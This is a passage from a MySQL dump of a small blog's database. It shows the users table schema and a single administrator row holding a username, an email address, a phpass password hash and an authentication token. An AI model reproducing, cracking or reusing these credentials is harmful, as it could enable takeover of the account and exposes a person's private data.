INSERT INTO `kirieblog_relationships` VALUES (3,1),(4,1),(5,1),(6,1),(7,1),(8,1),(9,1),(10,1),(11,1),(12,1),(13,1),(14,1),(15,1),(16,1),(17,1);
/*!40000 ALTER TABLE `kirieblog_relationships` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `kirieblog_users`
--

DROP TABLE IF EXISTS `kirieblog_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `kirieblog_users` (
  `uid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(32) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL,
  `mail` varchar(200) DEFAULT NULL,
  `url` varchar(200) DEFAULT NULL,
  `screenName` varchar(32) DEFAULT NULL,
  `created` int(10) unsigned DEFAULT '0',
  `activated` int(10) unsigned DEFAULT '0',
  `logged` int(10) unsigned DEFAULT '0',
  `group` varchar(16) DEFAULT 'visitor',
  `authCode` varchar(64) DEFAULT NULL,
  PRIMARY KEY (`uid`),
  UNIQUE KEY `name` (`name`),
  UNIQUE KEY `mail` (`mail`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kirieblog_users`
--

LOCK TABLES `kirieblog_users` WRITE;
/*!40000 ALTER TABLE `kirieblog_users` DISABLE KEYS */;
INSERT INTO `kirieblog_users` VALUES (1,'kirie','$P$BwazfDq7tf.eQlgd3ngjXtx.o3X6Ic/','kirie@hack123.pw','http://www.typecho.org','kirie',1449027066,1449388433,1449228804,'administrator','b2e0ea60c72c4f8622aaa1c2426053dd');
/*!40000 ALTER TABLE `kirieblog_users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2015-12-08 15:27:38
